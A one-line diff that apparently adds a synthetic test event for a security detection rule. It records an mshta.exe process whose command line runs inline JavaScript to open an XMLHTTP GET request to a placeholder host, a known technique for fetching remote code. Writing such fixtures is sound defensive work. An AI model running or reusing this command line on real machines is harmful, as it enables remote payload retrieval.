@@ -1,0 +1,1 @@
+{"schema_version":1,"synthetic":true,"event":{"FileName":"mshta.exe","ProcessCommandLine":"mshta.exe javascript:a=new ActiveXObject('Microsoft.XMLHTTP');a.open('GET','https://example.invalid/a',false);close()"}}
